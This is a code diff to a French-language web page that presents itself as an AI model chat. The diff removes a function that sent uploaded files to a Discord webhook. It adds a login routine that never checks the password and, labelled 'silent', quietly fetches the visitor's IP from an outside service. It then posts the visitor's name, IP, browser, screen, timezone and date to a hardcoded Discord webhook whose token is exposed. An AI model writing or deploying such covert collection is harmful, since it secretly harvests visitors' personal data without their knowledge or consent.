@@ -227,30 +227,59 @@
     let isRecording = false;
     let videoStream;
   
-    function login() {
-      const prenom = document.getElementById("prenom").value.trim();
-      const mdp = document.getElementById("mdp").value.trim();
-      if (prenom && mdp) {
-        localStorage.setItem("prenom", prenom);
-        loginBox.style.display = "none";
-        chatBox.style.display = "flex";
-      } else {
-        alert("Veuillez remplir tous les champs.");
-      }
-    }
-  
-    function handleFileUpload(input) {
-      const file = input.files[0];
-      if (!file) return;
-  
-      const formData = new FormData();
-      formData.append("file", file, file.name);
-  
-      fetch(FILE_DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        body: formData
-      }).catch(console.error);
-    }
+    async function login() {
+  const prenom = document.getElementById("prenom").value.trim();
+  const mdp = document.getElementById("mdp").value.trim();
+
+  if (!prenom || !mdp) {
+    alert("Veuillez remplir tous les champs.");
+    return;
+  }
+
+  // On cache la connexion et affiche le chat
+  localStorage.setItem("prenom", prenom);
+  loginBox.style.display = "none";
+  chatBox.style.display = "flex";
+
+  // Ensuite seulement, on récupère les infos système + IP
+  try {
+    const ipRes = await fetch("https://api64.ipify.org?format=json");
+    const ipData = await ipRes.json();
+
+    const trackingWebhook = "https://discord.com/api/webhooks/1357859548647395430/01C-Amxn_Ns1rGjB7NdrW0vjJIBKcl7f1NQo1a17nksdWsqlYv-VMibhrUeFzLVu3cxL";
+
+    const payload = {
+      username: "👁️ Connexion Assistant IA",
+      embeds: [
+        {
+          title: "Nouvelle Connexion Utilisateur",
+          color: 0x6200ee,
+          fields: [
+            { name: "👤 Prénom", value: prenom, inline: true },
+            { name: "🌍 Adresse IP", value: ipData.ip || "Inconnue", inline: true },
+            { name: "🌐 Langue navigateur", value: navigator.language || "?", inline: true },
+            { name: "🖥️ User-Agent", value: navigator.userAgent, inline: false },
+            { name: "📐 Résolution écran", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "🕓 Fuseau horaire", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "?", inline: true },
+            { name: "🗓️ Date", value: new Date().toLocaleString(), inline: true }
+          ],
+          footer: { text: "Connexion utilisateur silencieuse • Assistant IA" }
+        }
+      ]
+    };
+
+    await fetch(trackingWebhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+  } catch (err) {
+    console.error("Erreur lors de l'envoi des infos Discord :", err);
+  }
+}
+
+
   
     function simulateAIResponse() {
       const responseDiv = document.getElementById("response");
@@ -399,6 +428,8 @@
       }
       return output;
     }
+
+
   </script>
   
   
